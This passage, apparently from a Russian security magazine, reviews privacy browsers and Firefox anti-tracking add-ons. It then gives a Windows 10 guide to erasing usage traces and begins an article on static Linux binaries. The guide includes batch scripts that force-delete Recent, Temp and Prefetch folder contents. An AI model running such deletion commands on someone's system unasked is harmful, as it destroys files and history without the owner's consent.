Bhardwaj) утверждает, что Epic успешно блокиру ет трекинг, фингерпринтинг,
назойливую рек ламу, криптомайнинг и магию вуду. Помимо версии для Win‐
dows, на сайте можно скачать релиз для macOS, там же присутствуют ссылки
на Google Play и App Store для скачивания мобильных версий.





                     Это прос то Epic какой‐то

Сразу после запуска приложения юзер видит гроз ное пре дупреждение о том,
что некоторые функции бра узера, такие как встроенный VPN, прокси и бло‐
кировщик рекламы, нужно уста новить отдельно в виде плагинов, доступных
на специальной страничке Epic Extension Store. Чем в таком случае Epic отли‐
чается от обычного «Хрома», в котором тоже можно настроить прокси и VPN
с помощью плагинов, для меня осталось загадкой. Что ж, посмотрим, что
умеет этот браузер из коробки с настройками по умол чанию.
 • Qualys Browser Check — проб лем и замеча ний нет.
 • Cloudflare — результат, аналогичный Comodo и Iron.
 • Panopticlick — браузер успешно блокирует рекламу и попытки трекинга,
   но не посылает DNT и имеет характерный «отпечаток».
 • Privacy Analyzer — тест «подвис» на определении IP‐адреса и геоло‐
   кации, результата я так и не дождался.
 • Webkay — сервис успешно определил мой IP и версию ОС, но не показал
   решительно никаких данных о железе, кро ме разряднос ти процессора.
  Браузер определяется как Chrome 84.0.4147.105.

Глядя на название продукта, я предвку шал, что можно будет написать
об «эпик фейл», но на удивление бра узер зарекомендовал себя совсем неп‐
лохо. Блокировка рекламы, трекин га, а также минимум передаваемых наружу
данных, и все это без дополнитель ных плагинов — довольно серьезная заяв‐
ка на успех.



                                     Раз работчик: Dooble Project Team
DOOBLE WEB BROWSER    Сайт: textbrowser.github.io/dooble/


Разработка этого браузера с открытым исходным кодом началась двенадцать
лет назад. Интерфейс Dooble основан на Qt, а само приложе ние кросс‐плат‐
форменное: есть версии для FreeBSD, Linux, macOS, OS/2 и Windows, причем
в виде портатив ной версии для всех платформ. Дис трибутив можно скачать
с GitHub в виде ZIP‐архива, в котором находится исполняемый файл и все
нужные библиотеки.
  С настройками по умолчанию Dooble автоматически удаляет cookies,
а хранимые в программе данные шифруются (за исключением информации
о пользовательских настройках). Браузер применя ет сес сионную модель
с использованием временных ключей, при этом парольную фразу можно
изменить без потери данных. Мас тер‐пароль нужно создать в настройках
при первом запуске Dooble, ина че при завершении работы все сохраненные
в браузере данные будут стерты. Эти функции поз воляют условно отнести
Dooble к категории безопас ных бра узеров.
  На моей виртуалке с Windows 10 Dooble наотрез отказал ся запускаться,
ругаясь на отсутствие какой‐то библиотеки, зато на хос товой машине с Win‐
dows 7 он неожиданно зарабо тал. Внешнее оформление программы можно
охарактеризовать фразой «привет из девяностых» — у меня он даже выдавил
ностальгическую слезу.





             Dooble — кросс‐платформенный браузер на Qt

Сравнительные тесты дали следующие результаты.
 • Qualys Browser Check — обозвал Dooble небезопасной версией
   Google Chrome — видимо, из‐за используемого браузером User Agent.
 • Cloudflare — результат, аналогичный Comodo, Iron, Epic и Brave.
 • Panopticlick — пол ный провал теста по всем пунктам.
 • Privacy Analyzer и Webkay — бра узер передал IP‐адрес, данные об ОС
   и железе, геоло кацию, экранное раз решение. Внешним сервисам прог‐
  рамма представляется как Chrome 84.0.4147.163.

Пожалуй, Dooble — самый быстрый из всех бра узеров, опробованных мной
в этом эксперименте. С учетом того что он представлен в виде портативной
версии, приложение может быть очень полезно для сис тем, в которых зат‐
руднена установка программ. Также, веро ятно, браузер при дется по вкусу
пользователям BSD и  Linux. Работос пособность приложения в Windows
10 вызывает определенные сомнения.


ВЫВОДЫ
Итоги эксперимента получились неоднозначные. Вопреки ожиданиям, луч‐
шие результаты показала не продукция прославленной компании Comodo,
а впол не скромные Brave и Epic. Одна ко неплох и Comodo Ice Dragon — он
отправляет наружу меньше данных об устрой стве, чем его собрат. Comodo
Dragon я бы поставил на четвертое место. Владельцам устройств со слабым
железом и старыми версиями ОС может прийтись по вку су Dooble, который
отличается неплохим быстродействием. А вот Waterfox и Iron утюгом нырнули
на самое дно нашего скромного рейтинга — они хуже конкурентов справ‐
ляются с рекламой и блокировкой трекин га.
  Очевидно, что ни одна из перечисленных в сегодняшней статье программ
не может обеспечить полную ано нимность и безопас ность в интернете.
Для настоящей конфиденциальности нужно исполь зовать VPN, отключать
в настройках браузера обра ботку скриптов, исполь зовать шифрованные кон‐
тейнеры для хранения данных форм и паролей. Кроме того, существу ет
широкий ассортимент плагинов, ориентированных на повышение уровня
безопасности при работе в сети. Но о них мы подробно поговорим в другой
раз.
ПРИВАТНОСТЬ
ПРИМОЧКИ
 ДЛЯ ЛИСИЧКИ





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru




         СОБИРАЕМ НАБОР
        ПОЛЕЗНЫХ ПЛАГИНОВ
           ДЛЯ FIREFOX





У Mozilla Firefox есть целая армия преданных фанатов. Оно
и неудивительно: браузер зареко мен довал себя как надеж‐
ный, быс трый, а главное — легко расширяемый с помощью
множес тва плагинов. Среди них — целый набор инструмен‐
тов для повышения анонимности и конфиденциальности.
Они позволяют превратить «Огненную лисицу» в мощный
безопасный браузер, который будет блокировать слежку
за пользователем. В этой статье мы рассмотрим самые
интересные из них.


Конечно, ничто не мешает тебе загрузить Tor Browser, который, к слову, и сам
основан на Firefox, или установить один из за щищенных браузеров. Но если
ты уже привык к Firefox, как к удобным домашним тапочкам, бережно хранишь
линки в «Избран ном» еще со времен Windows XP, да и вооб ще не склонен
к переме нам, на помощь придут соз данные независимыми разработчиками
расширения. С  их помощью можно блокиро вать  трекинг со  стороны
интернет‐ресурсов, менять данные геолокации, модифицировать «отпечаток»
браузера, а также делать множес тво других кру тых и полезных вещей.


PRIVACY POSSUM
 • privacy-possum

Это, наверное, один из самых извес тных плагинов для Firefox, предназначен‐
ных для борьбы со слежкой методом блокировки и фальсификации данных,
которые собирают различные трекинговые скрипты. Privacy Possum предот‐
вращает прием файлов cookies, блокиру ет HTTP‐заголовки set‐cookie и re‐
ferrer, а также искажает «отпечаток» браузера, что затрудняет фингерприн‐
тинг.


             INFO

                     Сайты могут отслеживать пользователя не только
                        с помощью куков, но и благодаря так называ емо‐
                     му отпе чатку браузера (browser ﬁngerprint). При‐
                        чем, помимо дан ных самого браузера  (таких
                         как User Agent), «отпечаток» включает сведения
                      о версии и  разрядности ОС, экранном  раз‐
                     решении  и   другие  передаваемые  наружу
                      параметры  аппаратной  и  программной  кон‐
                      фигурации  машины.  Подобный  «отпечаток»,
                        конечно, не уникален, но с определенной долей
                      достоверности   позволяет   идентифицировать
                       пользовате ля.


Продвинутых настроек у пла гина нет: его можно вклю чить или выключить, а на
страничке конфигурации — запретить автоматичес кое обновление и раз‐
решить ему запускаться в приват ном окне.





         Плагин Privacy Possum не имеет продвинутых настроек

После установки Privacy Possum мне ста ло край не любопытно, что скажет
о его работе тест Panopticlick, который мы ис пользовали в прошлый раз
для проверки защищенных бра узеров. Тест показал, что плагин и вправду
блокирует cookies и рекламные трекеры, а с помощью сайта Webkay удалось
выяснить, что при включенном рас ширении браузер оставляет о себе зна‐
чительно меньше информации, чем без него, — фактически, кроме IP‐адре‐
са, наружу утекла только раз рядность про цес сора, версия ОС и самого Fire‐
fox. Результат, прямо ска жем, вполне на уровне какого‐нибудь Comodo
Dragon.


TRACE
 • absolutedouble-trace

Еще один плагин, который «ломает» механизм фингерпринтинга, подменяя
отправляемые на удаленные серверы данные, в том числе изменяя HTTP‐
заголовки. Лилово‐алый с оранжевым оттенком фон страницы нас троек
как бы намекает нам на то, что авторы аддона шутить не любят — тут все
серьезно!





                      Так выглядят нас трой ки Trace

Trace работает со списками доменов, разделенных на категории, однако
в бесплатной версии плагина дос тупен только базовый спи сок, набор под‐
доменов Facebook и перечень сайтов, майнящих криптовалюты с исполь‐
зованием JavaScript. Все остальные катего рии — вроде видеотрекеров, сай‐
тов, любящих отправлять push‐уведомления, и ресурсов, рассылающих
спам, — доступны только премиум‐подписчикам.


TRACKMENOT
 • trackmenot

Этот плагин предназначен для борьбы с трекин гом поисковых запросов. Каж‐
дый пользователь знает на собственном горьком опыте: достаточно один раз
поискать в интернете совковую лопату, и следующую неделю ты будешь
любоваться рекламой граб лей, мотыг и даже мотокультиваторов. Вот этому
явлению и противостоит TrackMeNot, отправляя поисковикам рандомизи‐
рованные запросы, которые заставляют их электронные мозги кипеть и пла‐
виться. Настроек у это го пла гина побольше, но все они, в общем‐то, просты
и понятны.





                  Нас трой ки плагина TrackMeNot

Здесь можно, например, включить или отключить burst mode — отправку
запросов конкретно в тот поисковик, в котором юзер что‐то ищет в данный
момент, выбрать из спис ка используемые поис ковые системы или добавить
туда свою. Сре ди других нас троек — пери одичность отправки запросов
и ведение журнала, которое при желании можно отключить. Плагин переве‐
ден на шесть языков, однако рус ского среди них нет.


DECENTRALEYES
 • decentraleyes

Этот аддон защищает от отслежива ния через CDN, отправляя множес тво
запросов к публичным CDN‐службам вроде YandexCDN, GHL, MaxCDN. Как и
любое полезное изоб ретение, CDN приносит пользу не только простым поль‐
зователям, но и коммерсантам, желающим знать об этих самых пользовате‐
лях как можно больше, а лучше — все.


             INFO

                  CDN (Content Delivery Network), или сеть доставки
                           (и дистрибуции) содержимого, — это распре‐
                       деленная  аппаратно‐программная  инфраструк‐
                          тура, ускоряющая доставку кон тента конечным
                       пользовате лям. Физически это реализовано так:
                      идентичный кон тент размещают на нескольких
                         географически рассредото ченных серверах, что‐
                    бы сократить время ожидания и заг рузки данных
                      при обращении к такому серверу. Эта же сис‐
                        тема, как правило, использует сценарии сбора
                         статистики и контроля посещаемости, которая
                     может служить для отслеживания пользователей.





  В настройках Decentraleyes можно создать белый список доверенных
  доменов

Блокировка и подмена запросов CDN может поломать некоторые сайты,
поэтому плагин подставляет вместо загружа емых из сети локальные файлы
там, где это необходимо. Нас тройками рас ширение тоже небогато, но зато
на странице конфигурации можно добавить домены в белый спи сок — и к ним
не будет применяться CDN‐фильтрация.


CHANGE GEOLOCATION
 • change-geolocation-locguard

Название этого аддона говорит само за себя: он поз воляет грозить Южному
централу, сидя где‐нибудь в Мытищах, то есть менять геолокацию в Firefox.





               Настрой ки плагина Change Geolocation

По умолчанию плагин предлага ет использовать в качес тве текущей геопо‐
зиции исторический район Гринвич в Лондоне, но при желании ты можешь
задать в настрой ках любые координаты, переехав куда‐нибудь в Сохо.
Для этого нужно ввести желаемую широту и долготу и при необходимости
указать иные параметры API геоло кации. Очевидно, что плагин не поможет
в борьбе против алгоритмов, которые определяют местоположение поль‐
зователя по IP‐адресу, но все остальные сайты он способен обмануть.


HTTPS EVERYWHERE
 • https-everywhere

Довольно простой, но крайне полезный плагин, зас тавля ющий браузер при‐
нудительно включать HTTPS при соединении с сай тами, которые его под‐
держивают, даже если ты наб рал в адресной строке префикс http. Пос ле
установки расширения в инс трументальной панели Firefox появляется значок,
по щелчку на котором можно дезактивировать плагин, включить или отклю‐
чить принудительное блокирование незашифрованных HTTP‐запросов, а так‐
же нажатием одной кнопки добавить открытый в браузере сайт в спи сок
исключений. Довольно полезный инс тру мент для всех, кто заботится о собс‐
твенной безопасности.


FOXYPROXY
 • foxyproxy-standard

Широко известный, очень популярный и крайне востребованный плагин, поз‐
воляющий добавить в Firefox функцию, подоб ную разрекламированному VPN
в Opera. Просто указываешь в нас трой ках аддона адрес и порт любого бес‐
платного прокси‐сервера, пос ле чего его мож но включать или отключать
одним щелчком мыши — и все заблокированные интернет‐ресурсы снова
становятся доступны словно по волшебству.





                   Нас трой ки плагина FoxyProxy

FoxyProxy поддерживает сра зу несколько прокси‐серверов, поэтому ты
можешь быстро переключаться меж ду ними, если какой‐то сервис из списка
внезапно отвалится. Для пущего удобства аддон позволяет импортировать
ранее созданные настройки или заранее подготовленный список прокси,
а также экспортировать его для перено са на другой компьютер. Поддержи‐
вается множество типов серверов: HTTP, HTTPS, SOCKS 5 и 4, WPAD и PAC
URL — есть из чего выбрать. В общем, этот пла гин — маст‐хэв для каждого
пользователя Firefox. Если ты его еще не уста новил, торопись исправить
это упущение.


NOSCRIPT
 • noscript

Известно, что имен но скрипты чаще всего ока зываются основной причиной
утечки конфиденциальных данных в бра узере и нарушения при ватности. В Tor
Browser режим NoScript дос тупен из короб ки, в Firefox его можно включить,
установив одноимен ный плагин.





                    Нас трой ки плагина NoScript

Расширение делит все сайты на три категории — «по умолчанию», «доверен‐
ные» и «недоверенные». Для первой катего рии разрешено выполнение толь‐
ко некоторых, наиболее «безопасных» типов скриптов, доверенным доз‐
волено все, а на недоверенных сайтах скрипты, соответственно, под тоталь‐
ным запретом. Отредактировать списки и перенести сайт из одной категории
в другую можно на вкладке Per‐Site Permissions в окне настроек плагина.
Поскольку режим NoScript довольно часто лома ет структуру веб‐страниц,
нажатием одной кнопки в панели инс трументов Firefox можно временно
отключить аддон для текущего сайта либо сразу добавить его в доверенные.
Как и в предыдущем случае, NoScript поддерживает импорт и экспорт настро‐
ек, что позволяет быстро переносить их из одной системы в другую.


UBLOCK ORIGIN И UMATRIX
 • ublock-origin
 • umatrix

Два плагина от одного разработ чика, первый из которых предназначен
для блокировки рекламы, а вто рой — для перехвата и блокировки запросов
браузера. Расширение uBlock Origin имеет огромное количество настроек,
разобраться с которыми с ходу не так‐то прос то.





                  Нас трой ки плагина uBlock Origin

Здесь можно задать типы блокируемого контента и изменить отображение
статистики, отре дактировать списки филь тров, соз дать собственные фильтры
и правила фильтрации. В нас тройках можно завес ти белый список доменов,
к которым не будет применять ся фильтрация контента, а также импорти‐
ровать правила и настройки с дру гого компьютера.
  Плагин uMatrix настраивается аналогичным образом — пользователю дос‐
тупны для редактирования пра вила фильтрации запросов, черный список
доменов, обращения к которым будут блокироваться, а также ряд настроек
приватности. Среди них — автоматическое удаление заблокированных и сес‐
сионных файлов cookies, очистка содержимого локального хранилища бра‐
узера через заданные промежутки времени, блокировка всех попыток аудита
гиперссылок,  запрет на  загрузку  с  веб‐стра ниц сме шанного  контента
одновременно через HTTP и HTTPS, а также некото рые другие.
  Безусловно, чтобы разобрать ся в параметрах работы этих аддонов, при‐
дется потратить некото рое время. Но оно того стоит: если все настроить пра‐
вильно,  другие  блокировщики  рекламы  и  контентные  фильтры  тебе
не понадобятся.


GOOGLE SEARCH LINK FIX
 • google-search-link-fix

Это простой плагин, блокиру ющий сбор статистики о нажатиях на ссылки
в поисковой выдаче Google. Уста нови его, если не желаешь передавать
в «Корпорацию доб ра» сведения о заинтересовавших тебя результатах поис‐
ка. Или пользуйся Яндексом.


FACEBOOK CONTAINER
 • facebook-container

Аддон от разработчиков Firefox, направлен ный прицельно против Facebook.
Он блокирует сбор данных о пользователе этой соци альной сетью не только
внутри самой Facebook, но и на всех аффи лированных сайтах, включая Insta‐
gram и Messenger. Кроме того, размещенные на любой веб‐странице фей‐
сбучные кнопки Like и Share отслежива ют, что ты заходил на эту страницу,
даже если ты их не нажимал, — при условии, что ты залогинен в социальной
сети. Facebook Container блокиру ет эту активность и удаляет «шпионские»
кнопки с веб‐страниц.
  Используй данный плагин, если не хочешь делиться с Марком Цукер‐
бергом историей своего веб‐серфинга и передавать ему сведения о своей
активности в сети.


И ЭТО ДАЛЕКО НЕ ВСЕ
Несомненно, этот список пла гинов далеко не полон — при желании ты
можешь найти множество других бесплат ных расширений для Firefox, которые
сделают твой браузер еще более безопас ным и позаботятся о конфиден‐
циальности. Мы рассмотрели только самые известные из них, которые могут
удовлетворить большую часть пот ребнос тей даже самого искушенного поль‐
зователя. Будем рады, если в комментариях ты поделишься и своими инте‐
ресными находками.
ПРИВАТНОСТЬ
ЗАМЕТАЕМ
 СЛЕДЫ
    WINDOWS 10   В

         КАК ЗАСТАВИТЬ ВИНДУ
            ВСЕ ЗАБЫТЬ





                                        ShəLMā
                                             Киберпанк, технокрыс
                                        и просто мерзкая личность.
                                            schelma@protonmail.com





Куки, история посещений, сох ранен ные пароли, данные
из реестра винды — все эти дра гоценности могут попасть
в чьи‐нибудь грязные руки, если эти руки доберутся до кла‐
виатуры твоей машины. Вот почему очень важно уметь уда‐
лять логи, кеши и прочие кукисы, чтобы кто‐нибудь случай но
не выведал информа цию, которую лучше держать при себе.


Каждый «тыжпрограммист» хотя бы раз в жизни сталкивался с просьбами зна‐
комых, малознакомых и прочих сыновей маминой подруги «почис тить комп,
потому что тормозит». Однажды и мне принес такой ноут очень солидный
и серьезный на вид дядечка. Машина оказалась зат рояне на сверху донизу,
а добываемой скрытыми майнерами крипты вполне хватило бы на то, чтобы
удвоить ВВП какой‐нибудь небольшой африканской страны. Тайну про‐
исхождения этого зоопарка имени Джеральда Даррелла приоткрыла хистори
браузера: владелец бука оказался постоянным клиентом дамочек не слишком
тяжелого поведения и любителем домашних животных в самом неприглядном
смысле. Мораль этой басни прос та и незатейлива, как песни группы «Блес‐
тящие»: хочешь пустить за клавиату ру какого‐нибудь отмороженного панка
вроде меня, сначала хорошень ко приберись за собой. А о том, как это сде‐
лать наилучшим образом, мы сейчас и погово рим.


ЗАБЫВАЕМ НЕДАВНЕЕ ПРОШЛОЕ
Винда, словно романтичная барышня, береж но хра нит теплые вос поминания
о недавно открытых юзером документах и запущенных программах. Чтобы
заставить ее забыть о былом и начать жизнь с чистого листа, можно вос поль‐
зоваться какой‐нибудь подходящей софтиной, но для нас тоящего ковбоя это,
понятно, зашквар. Есть гораздо более простой и дей ственный метод —
без всяких там хитрых утилит и прочего ламерс тва.





Жми Windows + R и в открывшемся окошке набирай recent, после чего
не забудь нажать  Enter. Перед тобой — спи сок всех файлов и папок,
к которым текущий пользователь обращался в пос леднее время. Выделяем
содержимое этой папки нажатием Ctrl + A и смело жмем Del.
   Теперь аналогичным образом вычисти следующие папки:
 • %appdata%\microsoft\windows\recent\automaticdestinations\
 • %appdata%\microsoft\windows\recent\CustomDestinations

Там хранятся пути к файловым объектам, исполь зуемым приложениями Win‐
dows. Чтобы автоматизиро вать процесс, можно использовать вот такой
скрипт:


@ECHO OFF
TITLE ReCeNT FiLEs cLEanUp
del /F /Q %APPDATA%\Microsoft\Windows\Recent\*
del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*
del /F /Q %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*
PAUSE

Следует сохранить скрипт в прос том тексто вом файле, присвоить ему рас‐
ширение .bat и запускать всякий раз, когда у тебя возникнет игри вое нас‐
троение.
   Чтобы в Windows 10 отключить показ часто исполь зуемых программ в глав‐
ном меню, нажми Windows + R, набери в открывшемся поле ms‐settings:
personalization, в окне «Парамет ры» щелкни кры сой на значке «Пуск», пос‐
ле чего отключи функции «Показывать недавно добавленные приложения»,
«Показывать наиболее час то используемые приложения» и «Показы вать пос‐
ледние открытые элементы в списках переходов меню „Пуск“».





          От клю чаем все лишнее в главном меню Windows 10

Напоследок можно грохнуть хистори файлового менеджера Windows, которую
он пихает повсюду: в адресную строку, в виртуаль ную папку «Быстрый дос‐
туп», показывает, если щелкнуть пра вой клавишей мыши на значке запущен‐
ного проводника в панели задач, и даже использует для автозапол нения
в окошке «Выпол нить». Запускаем проводник, откры ваем вкладку «Вид»
и жмем кнопку «Параметры». В разделе «Конфиденциальность» сбрасываем
оба флажка и жамкаем на кнопку «Очистить». Чис тота — чисто «Тайд»!





               Очищаем историю «Полуп роводника»

Было бы очень неплохо, если бы винда все‐таки научилась самос тоятельно
прибивать лишние файлы после завершения сес сии юзера. Это можно нас‐
троить с помощью локальных групповых политик. Нажми Windows + R, набери
в окне «Выполнить» строку gpedit.msc, не забудь Enter. Открой раз дел «Кон‐
фигурация пользователя → Административные шаблоны → Меню «Пуск»
и панель задач» и вклю чи перечисленные ниже политики:
 • «Очистить журнал недавно открывавшихся документов при выходе»;
 • «Очистка списка недавно использовавшихся программ для новых поль‐
   зователей»;
 • «Очистить уведомления на плит ке при выходе»;
 • «Удалить список программ, закреплен ных в меню „Пуск“»;
 • «Удалить список часто используемых программ в меню „Пуск“»;
 • «Отключить сле жение за действиями пользователя»;
 • «Не хранить сведения о недавно открывавшихся документах»;
 • «Удалить меню „Недавние документы“ из меню „Пуск“»;
 • «Не отображать и не отслеживать элементы переходов в списках удален‐
   ных расположений»;
 • «Удалить список „Недавно добавленные“ из меню „Пуск“».





  С помощью локальных политик можно научить винду прибирать за собой


УДАЛЯЕМ ВРЕМЕННЫЕ ФАЙЛЫ
Временные файлы не только занимают место на диске (которого и без того
никогда не хватает), но и порой содержат много полезной инфы. Тебе навер‐
няка доводилось восстанавливать из .tmp‐файлов вордовские документы,
когда у юзера неожиданно заканчивалось электричество, а заранее купить
бесперебойник он пожмотился. Понятно, что ана логичную опе рацию может
при желании проделать кто угодно.
   «Десятка» хранит временные файлы в нескольких папках, которые можно
открыть, набрав соот ветству ющий путь в окошке «Выполнить» (Windows + R):
 • %temp% (она же C:\Users\%Username%\AppData\Local\Temp) — вре‐
  менные файлы пользователей;
 • %windir%\temp — временные фай лы самой вин ды;
 • %windir%\Prefetch — кеш файлов для ускорения загрузки операци‐
   онной системы и приложений.

Можно почистить содержимое этих папок вручную, а можно использовать
скрипт:


@ECHO OFF
TITLE TeMp0RaRY F1Les re:MOVeR
RD %TEMP%\. /S /Q
RD %windir%\temp\. /S /Q
RD %windir%\Prefetch \. /S /Q
PAUSE

При запуске скрипт удалит все временные фай лы, которые в данный момент
не заняты другими процессами. Можно запускать его вручную или по рас‐
писанию. А можно сделать то же самое с помощью графического, извиняюсь
за выражение, интерфейса пользователя. Открой главное меню и в окне
«Параметры» перейди в раз дел «Сис тема → Память». Щелкни по надписи
«Временные файлы», затем установи все флажки на следующем экране
и нажми «Удалить файлы».





                     Чис тим временные файлы


УДАЛЯЕМ КЕШ И ХИСТОРИ БРАУЗЕРОВ
Винда хранит временные интернет‐файлы пользователя в папочке %USERPRO‐
FILE%\Local Settings\Temporary Internet Files, а кукисы — в %USER‐
PROFILE%\Cookies. К обеим пап кам у юзера нет доступа даже под локальным
админом — эти ограничения введены в целях безопас ности. Поэтому содер‐
жимое кеша и файлы cookies можно вычистить вручную, благо настройки бра‐
узеров позволяют это делать легко и непринужденно.


Edge
Наследник Internet Explorer — программа Edge слу жит только для того, чтобы
пользователи Windows 10 имели возможность скачать нормальный браузер.
Тем не менее для порядка следует упомянуть и его: щелкни по кнопке […]
в правом верхнем углу окна Edge, выбери в открывшемся списке пункт
«Параметры», в нем — «Конфиденциальность и безопасность». Нажми
на кнопку «Выберите, что нужно очистить» в разделе «Очис тить данные бра‐
узера», установи все флажки и нажми на кнопку «Очис тить».





                  Уда ляем данные из Microsoft Edge


Firefox
Открой меню щелчком мыши на соот ветс твующей кнопке в правом верхнем
углу окна браузера и в появившемся списке выбери «Настройки», затем —
«Приватность и защита». Найди раз дел «Куки и данные», нажми «Удалить дан‐
ные», установи в открывшемся окне все флажки и нажми «Удалить».





                      Уда ляем данные из Firefox


Chrome
Здесь тоже нужно щелкнуть по кнопке в пра вом верхнем углу, перейти в раз‐
дел «Настройки → Конфиденциальность и безопасность → Очистить исто‐
рию». В открывшемся окне выбери в меню пункт «Все время», установи соот‐
ветствующие флажки и нажми «Удалить данные».





                     Уда ляем данные из Chrome

По умолчанию Chrome уда ляет все данные и локально, и из профайла Google,
если пользователь залогинен в аккаунте. Чтобы сохранить историю браузера
и кукисы в облаке Google, перед очисткой хранилища браузера нужно выйти
из учетной записи.


Opera
Здесь схема действий аналогична: кнопка в правом верхнем углу — кнопка
«Очистить» в разделе «Конфиденциальность и безопасность», после чего
нужно выбрать в меню пункт «Все время», установить флажки и нажать «Уда‐
лить данные».


Яндекс.Браузер
Здесь нужно нажать кнопку «Настройки Яндекс.Браузера» в самой верхней
панели, перейти в раздел «История» и щелкнуть по надписи «Очистить исто‐
рию» слева внизу. Появится уже знакомое окошко с выбором периода
и флажками подлежащих удалению типов данных. Выбираем нужные пункты
и жмем «Очистить».


ЧИСТИМ РЕЕСТР
В системном реестре Windows хранится много всякого треша полезной
информации, которую можно использовать с недоб рыми намере ниями. Это,
например, список недавно подключавшихся к компу USB‐девайсов или мес‐
тоположение файлов.
  Проблема в том, что изменить, а тем более удалить некоторые ключи
реестра невозможно даже из‐под учетки админа, да и работа с ним вручную
требует слишком много времени и усилий. Чтобы сэкономить пару лишних
часов на что‐нибудь более веселое, можно исполь зовать для очистки реес‐
тра какую‐нибудь бесплатную программу. Например, Little Registry Cleaner.
  Софтина довольно простая в использовании, если не счи тать того, что
для работы ей требуется .NET Framework. В левой части окна Little Registry
Cleaner показаны разделы реестра и категории хра нящихся в них данных.
Кнопка «Сканирование реес тра» запус кает поиск ошибок и лишних ключей,
которые можно удалить с помощью кнопки «Устранение неполадок».





           Программа для чистки реес тра Little Registry Cleaner

К слову, с помощью меню «Инс трументы» можно запустить удобную тулзу
«Менеджер автозагрузки», поз воляющую вычис тить из автозапуска все лиш‐
нее, — нужные изменения будут внесены в реестр автоматически.
  Еще одна программа для очистки хра нящихся в реестре лишних данных
называется USB Oblivion. Использовать ее даже про ще, чем ковырять отвер‐
ткой в ухе: запускаешь софтину, уста навливаешь флажок «Произвести реаль‐
ную очистку» и нажимаешь на кнопку «Очистка».





                        Так работает USB Oblivion

После этого программа переза пустится под админом, остановит мешающие
ей жить службы Windows и удалит из реестра все данные, которые могут нести
в себе даже намек на конфиденциальность. Пос ле завершения этого уто‐
мительного процесса утилита перезаг рузит систему, не пугайся.


УДАЛЯЕМ КЕШ DNS
DNS — это не только сеть магазинов, торгующих компьютерным барахлом,
но и система адресации доменных имен в этих ваших интерне тах. Все обра‐
щения к DNS‐серверам кешируются, при чем сис тема хранит их столь же
бережно, как бабушка — ползунки своих любимых внуков. Чтобы почис тить
кеш DNS, выполни консольную команду ipconfig /flushdns.


ПОСЛЕСЛОВИЕ
Конечно, все перечисленные выше действия можно выпол нить и с помощью
всевозможных специализированных прог рамм вроде какой‐нибудь Wise care
365. Но лично я им не доверяю: во‐первых, бесплат ные утилиты часто тащат
за собой кучу рекламно го дерьсофта, во‐вто рых, удаляют информацию они
весьма избирательно, что‐то периодичес ки упуская, а в‐третьих, после кри‐
минальных историй с CCleaner использовать подоб ные инс трументы порой
себе дороже.
   Гораздо надежней все делать вручную или исполь зовать частичную авто‐
матизацию с помощью скриптов, примеры которых я приводил выше. Соб‐
рать из них один универ сальный скрипт ты можешь и сам в качестве домаш‐
него задания.
КОДИНГ

ПОЛНАЯ
 СОВМЕСТИМОСТЬ


      КАК РАБОТАЮТ СТАТИЧЕСКИЕ
    ИСПОЛНЯЕМЫЕ ФАЙЛЫ В LINUX





Многие пользователи Linux предпочитают
устанавливать программы из репозиториев
с  помощью   встро енно го  менеджера
пакетов, а все прочие способы рассмат‐
ривают как вынужденную меру. Однако раз‐         Даниил Батурин                                                                                   Координатор проекта VyOS
работчики   дис трибутивов,    очевидно,        (https://vyos.io),функциональщик,«языковед»,иногда
не могут включить в репозитории все прог‐         сетевойdaniil@baturin.orgадминистратор
раммы в мире, а сами авто ры программ
тоже не всегда могут или хотят поддержи‐
вать пакеты под множество дистрибутивов
и их версий.


В последние годы независимые от дистри бути ва решения для установки
пакетов набирают популярность: к 0install с его давней историей прибавились
более новые Flatpak и Snap, да и в Steam игр для Linux становится больше.
   Удобнее всего может быть обойтись без уста новки вообще — просто ска‐
чать файл, сделать его исполня емым с помощью chmod  +x и запус тить.
В этой статье мы рассмотрим, почему это возможно и как это реализовать.


ДВОИЧНАЯ СОВМЕСТИМОСТЬ В СИСТЕМАХ НА ОСНОВЕ LINUX
Часто можно услышать, что в Linux плохо с двоичной совместимостью.
При этом люди име ют в виду, что пакет из одной версии дистрибутива Linux
порой невозможно поставить на дру гую, — и в этом они правы. Однако само
утверждение о плохой дво ичной совместимости версий Linux неверно.
  Нужно вспомнить, что Linux — это только ядро, а вся опе рационная сис‐
тема состоит из ядра, разделяемых биб лиотек и прог рамм. Библиотеки мож‐
но разделить на стандартные библиотеки языков (например, libc, libstd++)
и сторонние библиотеки (например, GTK, Qt). Так вот, причиной сломанной
двоичной совместимос ти, как правило, ока зыва ются именно сторонние биб‐
лиотеки.
   Границы  ABI,  то  есть места, где  что‐то может сломаться, зависят
от метода компоновки (linking): ста тичес кого или динамичес кого.





        Границы ABI при статической и динамической компоновке

При динамической компоновке ста бильным должен оставаться ABI всех
задействованных библиотек. При этом ABI ядра может меняться, если биб‐
лиотеки это ком пенсируют. При ста тической компоновке важна только ста‐
бильность ABI ядра. Рассмот рим, как с этим в Linux.


Совместимость библиотек
ABI библиотеки — это набор символов, которые она экспортиру ет. Может ли
он быть стабильным? Да, реализация формата ELF в Linux поддерживает вер‐
сионирование символов. С помощью этого механизма библиотеки могут пре‐
доставлять несколь ко версий одной и той же функции с разными сигнатурами
и поведением.
  Очевидный недостаток это го подхода — невоз можно удалить из биб‐
лиотеки старый код без риска сло мать совместимость. Каждый раз, когда
сигнатура или поведение функции меняется, автор дол жен создать копию
старой  функции.  Кроме  того,  указывать  соответствие  имен  функций
в исходном коде и вер сий символов этих функций в двоичном — обязанность
разработчика.
  Не у каждого разработчика есть время и возможность поддерживать сов‐
местимость таким образом. Кроме того, радикальные изме нения во внут‐
ренностях библиотеки могут сделать этот подход совершенно непрактич‐
ным — придется, по сути, собирать один двоичный файл из нескольких вер‐
сий исходного кода.
  Именно из‐за идеи сделать  как можно больше библиотек общими
для всех пакетов мы и не можем поставить пакет из Debian 9 на 10 или из
CentOS 6 на 8 — сторонние библиотеки не вхо дят в пакет, а их ABI не оста‐
ется неизменным между версиями.
  Однако разработчики GNU  libc серьезно относятся к совместимос ти
и версионируют все символы. Благода ря этому, если собрать программу
на машине со старой версией glibc, она будет работать с более новыми (но
не наоборот).


Совместимость версий ядра
ABI ядра представляет собой соглашение о сис темных вызовах, а также
номера и порядок аргументов отдельных вызовов. К примеру, чтобы поп‐
росить ядро выпол нить write — системный вызов для записи данных в файл,
нужно поместить в один регистр процессора номер этого вызова, а в три дру‐
